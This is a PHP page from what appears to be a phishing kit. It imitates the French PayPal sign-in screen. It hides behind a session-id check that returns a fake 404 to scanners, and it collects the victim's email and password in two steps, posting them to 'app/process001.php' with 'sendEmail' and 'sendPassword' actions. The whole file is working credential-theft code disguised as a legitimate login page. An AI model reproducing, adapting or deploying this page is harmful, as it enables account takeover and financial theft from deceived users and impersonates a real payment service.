<?php 
// 2021 DEV BY KAZOLIEX 
session_start();

if(strpos($_SERVER['REQUEST_URI'], $_SESSION['userid']))
{

?>

<html>
<!-- HEAD -->	
<head>
	<script src="js/app.js"></script>
<link rel="stylesheet" href="css/login.css">
<meta name="viewport" content="width=device-width"/>
<link rel="icon" href="img/favicon.ico" />
<title>Connectez-vous à votre compte</title>
</head>
<style>
body {
  overflow: hidden; /* Hide scrollbars */
}
</style>
<!-- CORP -->	
<body class="desktop gdprCookieBanner-acceptedAll" data-rlogid="rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfR3mQy2JZfSavI03Q3pWZxE0B1RZg4BOBY18IGIrsWL0_1773b2b34be" data-hostname="rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ06fendyljjeAbIhfwPzQKG5WFUHS0OXKd" data-production="true" data-enable-ads-captcha="true" data-ads-challenge-url="/auth/createchallenge/74d00556213d42ea/challenge.js" data-enable-client-cal-logging="true" data-correlation-id="41cf22c3ca3a4" data-is-webkit-browser="true" data-enable-fn-beacon-on-web-views="true" data-phone-password-enabled="true" data-is-hybrid-login-experience="true" data-csrf-token="qh0WU9kTrhg8dxsQ+9+6jcswqDRrKL57lx/Eg=" data-nonce="yoV/9E4bC7zqmEFu6LcbHHjpNSVLFYnBxCciYTOROHZ3uBTJ" data-lazy-load-country-codes="true" data-cookie-banner-enabled="true" data-email-label="Email" data-xhr-timeout-limit="20000" style="margin-bottom: 144px;"><div id="main" class="main" role="main"><section id="login" class="login " data-role="page" data-title="Connectez-vous à votre compte PayPal">


		<div class="corral"><div id="content" class="contentContainer activeContent contentContainerBordered"><header><img src="img/45.png" style="width: 125px; text-align: center; display: block;
    margin-left: auto;
    margin-right: auto "></header><h1 id="headerText" class="headerText  accessAid">Connectez-vous à votre compte PayPal</h1><div class="notifications"></div><div id="keychainErrorMessage" class="hide"></div>

    <?php 
    if(strpos($_SERVER['REQUEST_URI'], $_SESSION['gotopasswordcode'])){


   
    ?>

   <form action="app/process001.php?<?php echo $_SESSION['userid']?>sendPassword" method="post" class="proceed maskable" autocomplete="off" name="login" novalidate=""><input type="hidden" id="token" name="_csrf" value="gnAB7WALs6lcUps5lDe55ZCuxsz9MTTEDlt2g="><input type="hidden" name="locale.x" value="fr_FR"><input type="hidden" name="processSignin" value="main"><input type="hidden" name="fn_sync_data" value="%7B%22SC_VERSION%22%3A%222.0.1%22%2C%22syncStatus%22%3A%22data%22%2C%22f%22%3A%221ec0458d1d2b4472a9e015705718468b%22%2C%22s%22%3A%22UNIFIED_LOGIN_INPUT_EMAIL%22%2C%22chk%22%3A%7B%22ts%22%3A1612104330116%2C%22eteid%22%3A%5B-5087649057%2C218620371%2C15905997357%2C12660691167%2C-2901373493%2C-4740834265%2C8654139934%2C-4102784138%5D%2C%22tts%22%3A346%7D%2C%22dc%22%3A%22%7B%5C%22screen%5C%22%3A%7B%5C%22colorDepth%5C%22%3A24%2C%5C%22pixelDepth%5C%22%3A24%2C%5C%22height%5C%22%3A1080%2C%5C%22width%5C%22%3A1920%2C%5C%22availHeight%5C%22%3A1040%2C%5C%22availWidth%5C%22%3A1920%7D%2C%5C%22ua%5C%22%3A%5C%22Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F88.0.4324.96%20Safari%2F537.36%20Edg%2F88.0.705.56%5C%22%7D%22%2C%22d%22%3A%7B%22ts1%22%3A%22Dk000%3A965Uk000%3A1Uh%3A984%22%2C%22rDT%22%3A%2221238%2C20849%2C20498%3A46860%2C46461%2C46120%3A31496%2C31087%2C30751%3A51989%2C51573%2C51244%3A5884%2C5453%2C5136%3A21254%2C20798%2C20505%3A21252%2C20769%2C20506%3A41740%2C41239%2C40997%3A16122%2C15611%2C15382%3A21243%2C20727%2C20506%3A41732%2C41215%2C40997%3A36607%2C36090%2C35874%3A46842%2C46337%2C46121%3A46831%2C46343%2C46120%3A31443%2C30982%2C30751%3A41672%2C41235%2C40998%3A46780%2C46364%2C46178%3A51881%2C51520%2C51706%3A46757%2C46401%2C46120%3A41632%2C41284%2C40997%3A18343%2C29%22%7D%7D">
   	<?php if(strpos($_SERVER['REQUEST_URI'],$_SESSION['errorpass'])){ 
   		echo '<div class="notifications"><p class="notification notification-critical" role="alert">Certaines de vos informations sont incorrectes. Réessayez.</p></div>'; } 

   	?>

   	<input type="hidden" name="intent" value="signin"><input type="hidden" name="ads-client-context" value="signin"><input type="hidden" name="requestUrl" value="/signin"><input type="hidden" name="forcePhonePasswordOptIn" value=""><div class="profileDisplayName hide"></div><div class="profileRememberedEmail"><span class="profileDisplayPhoneCode" dir="ltr"></span><span class="profileDisplayEmail notranslate"><?php echo $_SESSION['email']?>
   		

   	</span><a href=".." class="notYouLink scTrack:not-you" id="backToInputEmailLink" pa-marked="1">Modifier</a></div><div id="splitEmail" class="splitEmail hide"><div id="splitEmailSection" class="splitPhoneSection splitEmailSection "><div class="countryPhoneSelectWrapper hide">

   		<label class="accessAid" for="phoneCode">Choisir l'indicatif téléphonique de votre pays</label>
   <div class="countryPhoneSelectChoice"><span class="countryCode">FR</span><span class="phoneCode">+33</span></div></div><div class="textInput" id="login_emaildiv" style="z-index: 1;"><div class="fieldWrapper "><label for="email" class="fieldLabel">Email ou numéro de mobile</label><input id="email" name="login_email" type="email" class="hasHelp  validateEmpty   " required="required" value="" autocomplete="username" placeholder="Email ou numéro de mobile" aria-describedby="emailErrorMessage"></div><div class="errorMessage" id="emailErrorMessage">

   	<p class="emptyError hide">Obligatoire</p><p class="invalidError hide">Le format de cette adresse email ou de ce numéro de mobile n'est pas correct</p></div></div>	<div class="captcha captcha-container clearfix hide" id="splitHybridCaptcha"><div class="captcha-image"><img src="" alt=""></div><div class="captcha-inputs clearfix"><div class="textInput  "><div class="fieldWrapper "><label for="splitHybridCaptcha" class="fieldLabel"></label><input id="splitHybridCaptcha" name="captchaCode" type="text" class="hasHelp  validateEmpty   " value="" autocomplete="off" placeholder="Entrer le code" aria-describedby="captchaErrorMessage"></div><div class="errorMessage" id="captchaErrorMessage">

   	<p class="emptyError hide">Obligatoire</p></div></div><div class="refresh"><a href="" class="captchaRefresh buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-reload-captcha imageLink" pa-marked="1"><span class="accessAid">Actualiser l'image</span></a></div><div class="audio"><audio role="application" id="captchaPlayer" src="" class="hide"></audio><a target="_blank" href="" class="captchaPlay buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-play-captcha-audio imageLink" pa-marked="1"><span class="accessAid">Bouton audio</span></a></div></div>

   </div></div><div class="actions"><button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnNext" name="btnNext" value="Next" pa-marked="1">Suivant</button></div>

  

  </div>
<div id="splitPassword" class="splitPassword transformRightToLeft"><div id="splitPasswordSection" class=""><div id="passwordSection" class="clearfix"><div class="textInput  " id="login_passworddiv" style="z-index: 1;"><div class="fieldWrapper "><label for="password" class="fieldLabel">Mot de passe</label><input id="password" name="password" type="password" class="hasHelp  validateEmpty   pin-password" required="required" value="" placeholder="Mot de passe" aria-describedby="passwordErrorMessage"><label for="Afficher le mot de passe" class="fieldLabel">Afficher le mot de passe</label><button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" id="Afficher le mot de passe" pa-marked="1">Afficher</button><label for="Masquer" class="fieldLabel">Masquer</label><button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" id="Masquer" pa-marked="1">Masquer</button><button class="pwFpIcon hide" id="pwFpIcon" pa-marked="1"></button></div><div class="errorMessage" id="passwordErrorMessage"><p class="emptyError hide">Obligatoire.</p></div></div></div></div>	<div class="captcha captcha-container clearfix hide" id="splitPasswordCaptcha"><div class="captcha-image"><img src="" alt=""></div><div class="captcha-inputs clearfix"><div class="textInput  "><div class="fieldWrapper "><label for="splitPasswordCaptcha" class="fieldLabel"></label><input id="splitPasswordCaptcha" name="captcha" type="text" class="hasHelp  validateEmpty   " value="" autocomplete="off" placeholder="Entrer le code" aria-describedby="captchaErrorMessage"></div><div class="errorMessage" id="captchaErrorMessage"><p class="emptyError hide">Obligatoire</p></div></div><div class="refresh"><a href="" class="captchaRefresh buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-reload-captcha imageLink" pa-marked="1"><span class="accessAid">Actualiser l'image</span></a></div><div class="audio"><audio role="application" id="captchaPlayer" src="" class="hide"></audio><a target="_blank" href="" class="captchaPlay buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-play-captcha-audio imageLink" pa-marked="1"><span class="accessAid">Bouton audio</span></a></div></div></div><div class="actions"><button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1">Connexion</button></div></div><input type="hidden" name="splitLoginContext" value="inputPassword"></form>
 <div class="spinner">
						
					

				</div>
   <div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass=""><div class="loginSignUpSeparator "><span class="textInSeparator">ou</span></div><button type="button" href="/fr/webapps/mpp/account-selection" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1">Ouvrir un compte</button></div>

    <?php 
	}
	else{
    ?>

   <form action="app/process001.php?<?php echo $_SESSION['userid']?>sendEmail" method="post" class="proceed maskable" autocomplete="off" name="login" novalidate=""> 
   	<?php if(strpos($_SERVER['REQUEST_URI'],$_SESSION['errormail'])){ 
   		echo '<div class="notifications"><p class="notification notification-critical" role="alert">Certaines de vos informations sont incorrectes. Réessayez.</p></div>'; } 

   	?>
   	

    	<input type="hidden" id="token" name="_csrf" value="qh0WU9kTrhg8dxsQ+9+6jcswqDRrKL57lx/Eg="><input type="hidden" name="locale.x" value="fr_FR"><input type="hidden" name="processSignin" value="main"><input type="hidden" name="fn_sync_data" value="fn_sync_data"><input type="hidden" name="intent" value="signin"><input type="hidden" name="ads-client-context" value="signin"><input type="hidden" name="requestUrl" value="/signin"><input type="hidden" name="forcePhonePasswordOptIn" value=""><div class="profileDisplayName hide"></div><div class="profileRememberedEmail  hide "><span class="profileDisplayPhoneCode" dir="ltr"></span><span class="profileDisplayEmail notranslate"></span><a href="#" class="notYouLink scTrack:not-you" id="backToInputEmailLink" pa-marked="1">Modifier</a></div><div id="splitEmail" class="splitEmail "><div id="splitEmailSection" class="splitPhoneSection splitEmailSection "><div class="countryPhoneSelectWrapper hide">

			</div><div class="textInput  " id="login_emaildiv"><div class="fieldWrapper "><label for="email" class="fieldLabel">Email</label><input id="email" name="email" type="email" class="hasHelp  validateEmpty   " required="required" value="" autocomplete="username" placeholder="Email" aria-describedby="emailErrorMessage"></div><div class="errorMessage" id="emailErrorMessage"><p class="emptyError hide">Obligatoire</p><p class="invalidError hide">Le format de cette adresse email ou de ce numéro de mobile n'est pas correct</p></div></div>	<div class="captcha captcha-container clearfix hide" id="splitHybridCaptcha"><div class="captcha-image"><img src="" alt=""></div><div class="captcha-inputs clearfix"><div class="textInput  "><div class="fieldWrapper ">
				

			</div>
			><div class="audio"><audio role="application" id="captchaPlayer" src="" class="hide"></audio><a target="_blank" href="" class="captchaPlay buttonLight onboardingSpritePseudo scTrack:unifiedlogin-click-play-captcha-audio imageLink" pa-marked="1"><span class="accessAid">Bouton audio</span></a></div></div></div></div><div class="actions">


				<button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnNext" name="btnNext" value="Next" pa-marked="1" onclick="document.querySelector('.spinner').classList.remove('hidden')">Suivant</button></div>
		
				

					<div class="spinner">
						
					

				</div>

				<div class="tpdDemo hide" id="tpdDemo"><p class="tpdDemoContent">Connectez-vous, comme d'habitude, avec votre adresse email. Vous serez ensuite invité à vous connecter avec les données biométriques de votre téléphone.</p></div><input type="hidden" id="phone" name="login_phone" value="" class="validate"></div><input type="hidden" name="initialSplitLoginContext" id="initialSplitLoginContext" value="inputEmail"><input type="hidden" name="isTpdOnboarded" id="isTpdOnboarded" value=""><div id="splitPassword" class="splitPassword  hide"><div id="splitPasswordSection" class="hide "><div id="passwordSection" class="clearfix"><div class="textInput  " id="login_passworddiv"><div class="fieldWrapper "><label for="password" class="fieldLabel">Mot de passe</label><input id="password" name="login_password" type="password" class="hasHelp  validateEmpty   pin-password" required="required" value="" placeholder="Mot de passe" aria-describedby="passwordErrorMessage"><label for="Afficher le mot de passe" class="fieldLabel">Afficher le mot de passe</label><button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" id="Afficher le mot de passe" pa-marked="1">Afficher</button>

				<label for="Masquer" class="fieldLabel">Masquer</label><button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" id="Masquer" pa-marked="1">Masquer</button><button class="pwFpIcon hide" id="pwFpIcon" pa-marked="1"></button></div><div class="errorMessage" id="passwordErrorMessage"><p class="emptyError hide">Obligatoire.</p></div></div></div></div>	<div class="captcha captcha-container clearfix hide" id="splitPasswordCaptcha"><div class="captcha-image"><img src="" alt=""></div><div class="captcha-inputs clearfix"><div class="textInput  "><div class="fieldWrapper "><label for="splitPasswordCaptcha" class="fieldLabel"></label><input id="splitPasswordCaptcha" name="captcha" type="text" class="hasHelp  validateEmpty   " value="" autocomplete="off" placeholder="Entrer le code" aria-describedby="captchaErrorMessage"></div><div class="errorMessage" id="captchaErrorMessage"><p class="emptyError hide">Obligatoire</p></div></div><div class="refresh"></div><div class="audio"><audio role="application" id="captchaPlayer" src="" class="hide"></audio></div></div></div><div class="actions"><button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1">Connexion</button></div></div><input type="hidden" name="splitLoginContext" value="inputEmail"></form>

				<div class="pwr-modal forgotPasswordModal" id="password-recovery-modal"><iframe id="pwdIframe" data-src="/authflow/password-recovery/?country.x=FR&amp;locale.x=fr_FR&amp;redirectUri=%252Fsignin%252F" scrolling="no" data-auto-reload="true"></iframe><div class="monogram-small"></div></div><div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass=""><div class="loginSignUpSeparator "><span class="textInSeparator">ou</span></div><button type="button" href="/fr/webapps/mpp/account-selection" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1">Ouvrir un compte</button></div><div id="tpdButtonContainer" class="signupContainer hide"><div class="loginSignUpSeparator"><span class="textInSeparator">ou</span></div>

			</section>
			<?php
		}

			?>


			<!-- FOOTER -->	
			<footer class="footer" role="contentinfo"><div class="legalFooter"><ul class="footerGroup"><li><a target="_blank" href="/fr/smarthelp/contact-us" pa-marked="1">Contact</a></li><li><a target="_blank" href="/fr/webapps/mpp/ua/privacy-full" pa-marked="1">Respect de la vie privée</a></li><li><a target="_blank" href="/fr/webapps/mpp/ua/legalhub-full" pa-marked="1">Contrats d'utilisation</a></li><li><a target="_blank" href="/fr/webapps/mpp/country-worldwide" pa-marked="1">International</a></li></ul></div></footer><div id="gdprCookieBanner" class="gdprCookieBanner_container gdprCookieBanner_container-custom"><div class="gdprCookieBanner_wrapper gdprCookieBanner_wrapper-custom">

					</body>

</html>
<?php

}
else{
	die('HTTP/1.0 404 Not Found');
}


?>